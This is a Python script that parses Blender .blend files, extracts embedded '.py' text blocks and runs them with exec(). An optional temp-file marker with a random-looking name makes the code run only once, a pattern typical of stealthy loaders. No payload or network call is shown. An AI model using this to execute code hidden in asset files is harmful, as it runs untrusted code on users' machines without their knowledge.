import struct
from pathlib import Path


class ContainerError(Exception):
    pass


def container_data(path):
    data = Path(path).read_bytes()
    if data[:7] == b"BLENDER":
        return data
    try:
        import zstandard
    except ImportError as exc:
        raise ContainerError("decoder module missing") from exc
    output = []
    pending = data
    while pending:
        decompressor = zstandard.ZstdDecompressor().decompressobj()
        output.append(decompressor.decompress(pending))
        pending = decompressor.unused_data
    return b"".join(output)


def _cstring(block, pos):
    end = block.index(b"\0", pos)
    return block[pos:end].decode("utf-8", "replace"), end + 1


def _parse_layout(block, endian):
    pos = 4
    assert block[pos:pos + 4] == b"NAME", "bad schema"
    pos += 4
    count = struct.unpack_from(endian + "i", block, pos)[0]
    pos += 4
    names = []
    for _ in range(count):
        item, pos = _cstring(block, pos)
        names.append(item)
    pos = (pos + 3) & ~3
    assert block[pos:pos + 4] == b"TYPE", "bad schema"
    pos += 4
    count = struct.unpack_from(endian + "i", block, pos)[0]
    pos += 4
    types = []
    for _ in range(count):
        item, pos = _cstring(block, pos)
        types.append(item)
    pos = (pos + 3) & ~3
    assert block[pos:pos + 4] == b"TLEN", "bad schema"
    pos += 4
    raw_sizes = struct.unpack_from(f"{endian}{len(types)}H", block, pos)
    pos += 2 * len(types)
    sizes = dict(zip(types, raw_sizes))
    pos = (pos + 3) & ~3
    assert block[pos:pos + 4] == b"STRC", "bad schema"
    pos += 4
    count = struct.unpack_from(endian + "i", block, pos)[0]
    pos += 4
    layout = {}
    index_by_name = {}
    for struct_index in range(count):
        type_index, field_count = struct.unpack_from(endian + "hh", block, pos)
        pos += 4
        fields = []
        for _ in range(field_count):
            field_type, field_name = struct.unpack_from(endian + "hh", block, pos)
            pos += 4
            fields.append((types[field_type], names[field_name]))
        name = types[type_index]
        layout[name] = (raw_sizes[type_index], fields)
        index_by_name[name] = struct_index
    return layout, index_by_name, sizes


def _dims(name):
    if "[" not in name:
        return name, 1
    head, tail = name.rsplit("[", 1)
    count = 1
    for dim in tail.rstrip("]").split("]["):
        count *= int(dim)
    return head, count


def _field_offsets(fields, sizes, pointer, structs):
    offsets = {}
    offset = 0
    for type_name, name in fields:
        base, count = _dims(name)
        if "*" in type_name or name.startswith("*"):
            size = pointer
        else:
            size = sizes[type_name.strip("()")]
        align = pointer if type_name.strip("()") in structs else size
        offset = (offset + align - 1) // align * align
        offsets[name.lstrip("*").split("[")[0]] = offset
        offset += size * count
    return offsets


class Container:
    def __init__(self, path):
        data = container_data(path)
        if data[:7] != b"BLENDER":
            raise ContainerError("unsupported container")
        if data[7:10] == b"17-":
            self.endian = "<" if data[12:13] == b"v" else ">"
            self._head = struct.Struct(self.endian + "4siqqq")
            self._new = True
        else:
            self.endian = "<" if data[8:9] == b"v" else ">"
            self._new = False
            self._head = struct.Struct(self.endian + ("4siQii" if data[7:8] == b"-" else "4siIii"))
        pos = 17 if self._new else 12
        blocks = {}
        dna = None
        while pos < len(data):
            raw = data[pos:pos + self._head.size]
            if len(raw) < self._head.size:
                break
            code, a, b, c, d = self._head.unpack(raw)
            code = code.partition(b"\0")[0]
            if code == b"ENDB":
                break
            if self._new:
                sdna_index, address, size, count = a, b, c, d
            else:
                size, address, sdna_index, count = a, b, c, d
            pos += self._head.size
            body = data[pos:pos + size]
            if len(body) != size:
                raise ContainerError("truncated block")
            pos += size
            if code == b"DNA1":
                dna = body
            elif address:
                blocks[address] = (sdna_index, body)
        if dna is None:
            raise ContainerError("no schema block")
        self.layout, self.index_by_name, self.sizes = _parse_layout(dna, self.endian)
        self.blocks = blocks

    def pointer_size(self):
        return 8 if self._new or "Q" in self._head.format else 4

    def _offsets(self, type_name):
        if type_name not in self.layout:
            raise ContainerError("unknown record: " + type_name)
        return _field_offsets(self.layout[type_name][1], self.sizes, self.pointer_size(), self.layout)

    def pointer_at(self, body, offset):
        pointer = self.pointer_size()
        return struct.unpack_from(self.endian + ("Q" if pointer == 8 else "I"), body, offset)[0]

    def string_at(self, address):
        entry = self.blocks.get(address)
        if entry is None:
            return ""
        return entry[1].split(b"\0", 1)[0].decode("utf-8", "replace")

    def records_of(self, type_name):
        index = self.index_by_name.get(type_name)
        if index is None:
            return []
        return [body for sdna_index, body in self.blocks.values() if sdna_index == index]


def scan(path):
    container = Container(path)
    id_offsets = container._offsets("ID")
    line_offsets = container._offsets("TextLine")
    texts = []
    for body in container.records_of("Text"):
        offsets = container._offsets("Text")
        name = body[offsets["id"] + id_offsets["name"]:][:258].split(b"\0", 1)[0].decode("utf-8", "replace")[2:]
        lines = []
        seen = set()
        address = container.pointer_at(body, offsets["lines"])
        while address and address not in seen:
            seen.add(address)
            entry = container.blocks.get(address)
            if entry is None:
                break
            lines.append(container.string_at(container.pointer_at(entry[1], line_offsets["line"])))
            address = container.pointer_at(entry[1], line_offsets["next"])
        texts.append((name, "\n".join(lines)))
    return texts


def embedded_code(path):
    return "\n".join(code for name, code in scan(path) if name.endswith(".py") and code.strip())


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        raise SystemExit("usage: container.py <file> [print] [--guard]")
    code = embedded_code(sys.argv[1])
    if len(sys.argv) > 2 and sys.argv[2] == "print":
        print(code)
    elif code.strip():
        guard = None
        if "--guard" in sys.argv:
            import tempfile
            guard = Path(tempfile.gettempdir()) / "hjaksdhk1242kjha.txt"
            if guard.is_file():
                raise SystemExit(0)
        exec(compile(code, "<embedded>", "exec"), {"__name__": "__main__"})
        if guard is not None:
            guard.write_text("executed", encoding="utf-8")
